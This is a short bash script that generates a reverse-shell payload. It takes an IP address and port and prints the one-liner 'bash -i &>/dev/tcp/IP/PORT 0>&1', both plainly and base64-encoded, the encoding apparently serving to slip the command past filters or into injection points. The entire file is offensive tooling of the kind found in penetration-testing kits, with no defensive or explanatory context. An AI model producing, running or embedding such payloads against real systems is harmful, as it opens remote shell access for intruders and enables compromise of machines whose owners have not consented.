#!/bin/bash
if [ -z "$1" ]
  then
    echo "Please specify IP"
    exit
fi
if [ -z "$2" ]
  then
    echo "Please specify Port"
    exit
fi
echo "bash -i &>/dev/tcp/$1/$2 0>&1"
echo "bash -i &>/dev/tcp/$1/$2 0>&1" | base64
